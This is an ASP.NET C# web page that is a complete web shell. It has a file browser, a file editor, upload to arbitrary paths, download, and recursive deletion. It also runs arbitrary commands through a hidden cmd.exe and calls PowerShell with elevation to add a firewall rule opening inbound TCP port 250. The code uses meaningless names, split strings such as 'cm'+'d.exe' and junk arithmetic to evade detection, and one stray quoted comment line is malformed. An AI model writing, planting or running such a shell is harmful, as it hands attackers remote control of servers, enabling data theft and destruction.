<%@ Page Language="C#" Debug="true" %>
<%@ import Namespace="System"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace = "System.Web"%>
<%@ import Namespace = "System.Net"%>
<%@ import Namespace = "System.Text"%>
<%@ import Namespace = "System.Globalization"%>
<%@ import Namespace = "System.Collections.Specialized"%>
<%@ import Namespace = "System.Web.Hosting"%>
<%@ import Namespace = "System.Data"%>
<%@ import Namespace = "System.Drawing"%>
<%@ import Namespace = "System.Windows.Forms"%>
<%@ import Namespace = "System.Threading.Tasks"%>

<script runat="server">
    string aqo = ""; 
    string dsa = ""; 
    List<string> bqw = new List<string>();
    public void Page_Load(object sender, EventArgs e)
    {
        if(aqo==""){gj.DataSource=POIj("C"+":"+"/");
        gj.DataBind();
        }
            else{gj.DataSource = POIj(aqo);
            gj.DataBind();
        }
    }
        public void Ugw(Object sender, EventArgs e)
        {
            if(5+1<(6+7)) 
            {
                int n=70;
                int o=1;
                int t=1;
                int s=0;
                while(n>=s)
                {s=o+t;o=t;t=s;}
            }
            ProcessStartInfo ghjf=new ProcessStartInfo(@"cm"+@"d.exe", @"/"+@"C"+uhgl.Text+"");
            ghjf.WindowStyle = ProcessWindowStyle.Hidden;
            ghjf.RedirectStandardOutput = true;
            ghjf.UseShellExecute = false;
            ghjf.CreateNoWindow = true;
            Process sjt=Process.Start(ghjf);
            StreamReader kbjhgw=sjt.StandardOutput; 
            string lnk = kbjhgw.ReadToEnd(); 
            string tx = ""; 
            string[] wds = lnk.Split(new char[] { '\n' }); 
            foreach (string el in wds) 
                { tx = tx + el + "\n";} 
            vwg.Text = tx; 
            gj.DataSource = POIj(cnb.Text);
            gj.DataBind();
        }
        public void IROPn(Object sender, EventArgs e)
        { 
            string a = @"""ALLOW"""; 
            string g="New-NetFirewallRule -DisplayName "+a+" -Direction inbound -Profile Any -Action Allow -LocalPort 250 -Protocol TCP"; 
            ProcessStartInfo ghjf=new ProcessStartInfo();
            ghjf.FileName=@"Powe" + @"rShell";
            ghjf.Arguments=g;
            ghjf.Verb = "runas";
            ghjf.WindowStyle = ProcessWindowStyle.Hidden;
            ghjf.RedirectStandardOutput = true;
            ghjf.UseShellExecute = false;
            ghjf.CreateNoWindow = true;
            Process sjt=Process.Start(ghjf);
            StreamReader kbjhgw=sjt.StandardOutput; 
            string lnk = kbjhgw.ReadToEnd(); 
            string tx = ""; 
            string[] wds = lnk.Split(new char[] { '\n' }); 
            foreach (string el in wds) 
                { tx = tx + el + "\n";} 
            vwg.Text = g + tx; 
            gj.DataSource = POIj(cnb.Text);
            gj.DataBind();
        } 
        public void FTYuvgh(Object sender, EventArgs e)
        {
            if(17>(15-5))
            {
                double s=0.0;
                double h=(18-12)/6;
                for(int i=0; i<10; i++)
                    {s+=0.5*h*(12+i*h)+(12+(i+1)*h);}
                int qr=0;
                string te="";
                string asqw=HttpContext.Current.Request.Url.AbsoluteUri;
                for(int a=asqw.Length-1; a>1; a--)
                    {
                        if(asqw[a]=='/')
                        {
                            te=asqw.Remove(asqw.Length-1-qr, qr+1);
                            break;
                        }
                        qr++;
                    }
            }
            dto.PostedFile.SaveAs(Server.MapPath("~/")+dto.FileName ); 
            try { 
                    if (!File.Exists(txt_upl.Text + dto.FileName)) 
                        File.Move(Server.MapPath("~/") + dto.FileName, txt_upl.Text + dto.FileName); 
                    else { File.Delete(txt_upl.Text + dto.FileName);
                        File.Move(Server.MapPath("~/") + dto.FileName, txt_upl.Text + dto.FileName);
                         }; 
                } 

            catch (Exception ex) 
            { 
                txt_upl.Text = "Access Denied!"; 
            } 
            gj.DataSource = POIj(cnb.Text);gj.DataBind();
        }
        public void Aer(Object sender, EventArgs e) 
        {
            string s=cnb.Text;
            gj.DataSource=POIj(s);
            gj.DataBind();
        }
        public DataTable POIj(string ert)
        {
            DataTable dt=new DataTable();
            dt.Columns.AddRange(new DataColumn[4] {new DataColumn("AHae", typeof(string)), new DataColumn("Afqr", typeof(string)), new DataColumn("Xcba", typeof(string)), new DataColumn("Yiop", typeof(string))});
            try{
                if(ert=="C"+":/"||ert==@"C"+@":\"||ert==null){}else{FileInfo finfolast=new FileInfo(Path.GetDirectoryName(ert));var pvd = new Provider { AHae = Path.GetDirectoryName(ert), Afqr = "F" + "OLDER", Xcba = finfolast.LastWriteTime, Yiop = "" };
                    "//SAM Dobavuv dlya podsvetku
                    dt.Rows.Add(pvd.AHae, pvd.Afqr, pvd.Xcba, pvd.Yiop);
                }
                    
                string[] foj=Directory.GetDirectories(ert);
                foreach(string hgfjkd in foj) 
                    {
                        FileInfo fio=new FileInfo(Path.GetFullPath(hgfjkd));
                        var pvd=new Provider {AHae=hgfjkd, Afqr="FOL"+"DER", Xcba=fio.LastWriteTime, Yiop=""};
                        dt.Rows.Add(pvd.AHae, pvd.Afqr, pvd.Xcba, pvd.Yiop);
                    }
                string[] bae=Directory.GetFiles(ert);
                foreach(string hg in bae)
                    {
                    FileInfo miuk=new FileInfo(Path.GetFullPath(hg));
                    double ap = Convert.ToDouble((new FileInfo(hg).Length)) / 1024.0; 
                    var pvd=new Provider {AHae=hg,Afqr=Path.GetExtension(Path.GetFullPath(hg)), Xcba= miuk.LastWriteTime, Yiop=ap.ToString()};
                    dt.Rows.Add(pvd.AHae, pvd.Afqr, pvd.Xcba, pvd.Yiop);}}
            catch(Exception e)
            {}
            return dt;
        }
        public void tchng(object sender, EventArgs e) 
        { }
        public override void Validate()
        {base.Validate();} 
        public void Svas(Object sender, EventArgs e) 
        { 
            t_rd.Text = t_rd.Text.Replace('/', '\\');
            File.WriteAllText(t_rd.Text, vwg.Text);
            gj.DataSource = POIj(cnb.Text); 
            gj.DataBind();
        } 
        public void uiewhfdsvc(object source, GridViewCommandEventArgs e) 
        {
            if(e.CommandName=="ODJ")
            {
                GridViewRow row=(GridViewRow)(((LinkButton)e.CommandSource).NamingContainer);
                int uty=row.RowIndex;
                var i= POIj(cnb.Text).Rows[uty][0];
                aqo=i.ToString();
                if (System.IO.File.Exists(aqo)) 
                { 
                    t_rd.Text=aqo;
                    FileStream fst = File.OpenRead(aqo); 
                    byte[] ar = new byte[fst.Length]; 
                    fst.Read(ar, 0, ar.Length); 
                    string tx = System.Text.Encoding.Default.GetString(ar); 
                    vwg.Text = tx; 
                    gj.DataSource = POIj(Directory.GetParent(aqo).ToString()); 
                    gj.DataBind(); 
                    fst.Close(); 
                } 
                else 
                { 
                    gj.DataSource = POIj(aqo); 
                    gj.DataBind(); 
                    cnb.Text = aqo; 
                } 
            }
            if(e.CommandName=="ODD") 
            {
                bqw.Clear();
                GridViewRow zx=(GridViewRow)(((LinkButton)e.CommandSource).NamingContainer);
                int qw=zx.RowIndex;
                var i=POIj(cnb.Text).Rows[qw][0];
                aqo = i.ToString();
                string parrent=Directory.GetParent(aqo).ToString();
                IUHj(aqo);
                if(bqw.Count != 1)
                {
                    for(int j=bqw.Count-1; j>0; j--)
                    {
                        Directory.Delete(bqw[j]);
                    }

                    Directory.Delete(aqo);
                }
                gj.DataSource = POIj(cnb.Text);
                gj.DataBind(); 
            }
            if(e.CommandName=="ODO") 
            {
                GridViewRow r=(GridViewRow)(((LinkButton)e.CommandSource).NamingContainer);
                int ghj = r.RowIndex;
                var i = POIj(cnb.Text).Rows[ghj][0];
                FileInfo file = new FileInfo(i.ToString());
                string ct = MimeMapping.GetMimeMapping(i.ToString());
                Response.Clear();
                Response.AddHeader("Cont"+"ent-Dispos"+"ition","attach"+"ment; fil"+"ename="+Path.GetFileName(i.ToString()));Response.AddHeader("Co"+"ntent-Le"+"ngth", file.Length.ToString());
                Response.ContentType = ct;Response.Flush();
                Response.TransmitFile(i.ToString());
                cnb.Text = Path.GetFileName(i.ToString()); 
                gj.DataSource = POIj(Directory.GetParent(i.ToString()).ToString());
                gj.DataBind();
            }
        }
        public void IUHj(string path)
        {
            bqw.Add(path);
            FileAttributes jhg = System.IO.File.GetAttributes(path);
            if ((jhg & FileAttributes.Directory) != FileAttributes.Directory)
            {
                System.IO.File.Delete(path);
            }
            else
            {
                if(bqw.Count!=0)
                {
                    int sc=0;
                    for(int dr=0; dr<bqw.Count; dr++)
                    {
                        if(bqw[dr] == path)
                        sc++;
                    }
                    if(sc==0)
                    {
                        bqw.Add(path);
                    }
                }
                else
                {
                    bqw.Add(path);
                }
                string[] khj = Directory.GetFiles(path);
                if(khj.Length != 0)
                {
                    for (int k = 0; k < khj.Length; k++)
                    {
                        System.IO.File.Delete(khj[k]);
                    }
                }
                string[] rou = Directory.GetDirectories(path);
                if (rou.Length != 0)
                {
                    for(int i=0; i<rou.Length; i++)
                    {
                        string[] kuy = Directory.GetFiles(rou[i]);
                        for (int j = 0; j < kuy.Length; j++)
                        {
                            System.IO.File.Delete(kuy[j]);
                        }
                        IUHj(rou[i]);
                    }
                }
            }
        } 
        public class Provider 
        {
            public string AHae 
            {
                get; 
                set; 
            } 
            public string Afqr 
            { 
                get; 
                set; 
            } 
            public DateTime Xcba 
            { 
                get; 
                set; 
            } 
            public string Yiop 
            { 
                get; 
                set; 
            }  
        }
</script>
<html>
 <body style="background-color: burlywood">
  <form runat="server">
      <div class="container">
        <div class="row ">
            <div class="col-5" style="float:left; width:40%" >
                <div class="col-6" style="float: left; width: 50%">
                    <div>
                        <p id="l_up" style="color: darkolivegreen">
                            <asp:Label ID="jsc" Text="Upload file" runat="server" />
                        </p>
                        <p id="f_u">
                            <asp:FileUpload ID="dto" runat="server" />
                        </p>
                        <p id="txt_u">
                            <asp:TextBox ID="txt_upl" ForeColor="darkolivegreen" Text="Enter path" runat="server" />
                        </p>
                        <p id="btn_u">
                            <asp:Button ID="btn_upl" OnClick="FTYuvgh" Text="Upload" runat="server" />
                        </p>
                    </div>
                    <div>
                        <p id="l_c" style="color: darkolivegreen">
                            <asp:Label ID="in_lbl" Text="CMD" runat="server" />
                        </p>
                        <p id="tb_c">
                            <asp:TextBox ID="uhgl" ForeColor="darkolivegreen" Text="Enter command" runat="server" />
                        </p>
                        <p id="ctn_c">
                            <asp:Button ID="btn_cmd" OnClick="Ugw" Text="Run cmd" runat="server" />
                        </p>
                        <div id="l_u" style="color: darkolivegreen">
                            <asp:TextBox ID="vwg" Text="" runat="server" ForeColor="darkolivegreen" TextMode="MultiLine" Width="200%" Height="50%" OnTextChanged="tchng" />
                        </div>
                        <div id="t_r" style="color: darkolivegreen">
                            <asp:TextBox ID="t_rd" Text="path" runat="server" ForeColor="darkolivegreen" />
                        </div>
                        <div id="bt_red">
                            <asp:Button ID="btn_red" Text="Save" OnClick="Svas" runat="server" />
                        </div>
                    </div>
                </div>
                <div class="col-6" style="float: right; width: 50%">
                    <p style="color: darkolivegreen">
                        <asp:Label Text="Open port" runat="server" />
                    </p>
                    <p style="color: darkolivegreen">
                        <asp:TextBox ID="t_pt" ForeColor="DarkOliveGreen" Text="Enter port" runat="server" />
                        <asp:Button ID="btn_pt" OnClick="IROPn" Text="Open" runat="server" />
                    </p>
                </div>
            </div>
            <div class="col-5" style="float:right; width:40%">
                <p id="tb_j">
                    <asp:TextBox ID="cnb" ForeColor="darkolivegreen" Text="C:/" runat="server"/> <asp:Button ID="btn_jmp" OnClick="Aer" runat="server"/></p>
                <p id="dg">
                    <asp:GridView ID="gj" runat="server" PageSize="10" AutoGenerateColumns="false" DataKeyNames="AHae" OnRowCommand="uiewhfdsvc" HeaderStyle-BackColor="#808080" HeaderStyle-ForeColor="White"
                        RowStyle-BackColor="#cccccc" AlternatingRowStyle-BackColor="White" AlternatingRowStyle-ForeColor="#000" Width="100%">
                        <Columns>
                            <asp:TemplateField HeaderText="Name">
                                <ItemTemplate>
                                    <asp:LinkButton ID="lbn" ForeColor="darkolivegreen" runat="server" CommandArgument='<%# Eval("AHae") %>' CommandName="ODJ" Text='<%# Eval("AHae") %>' />
                                </ItemTemplate>
                            </asp:TemplateField>
                            <asp:BoundField HeaderText="Ext" ItemStyle-ForeColor="darkolivegreen" DataField="Afqr" />
                            <asp:BoundField HeaderText="Time" ItemStyle-ForeColor="darkolivegreen" DataField="Xcba" />
                            <asp:BoundField HeaderText="Size(kB)" ItemStyle-ForeColor="darkolivegreen" DataField="Yiop" />
                            <asp:TemplateField HeaderText="Delete">
                                <ItemTemplate>
                                    <asp:LinkButton ID="Dbtn" runat="server" ForeColor="darkolivegreen" Text="Delete" CommandName="ODD" />
                                </ItemTemplate>
                            </asp:TemplateField>
                            <asp:TemplateField HeaderText="Download">
                                <ItemTemplate>
                                    <asp:LinkButton ID="Dowbtn" runat="server" ForeColor="darkolivegreen" Text="Download" CommandName="ODO" />
                                </ItemTemplate>
                            </asp:TemplateField>
                        </Columns>
                    </asp:GridView>
                </p>
            </div>
        </div>
    </div>
  </form>
 </body>
</html> 
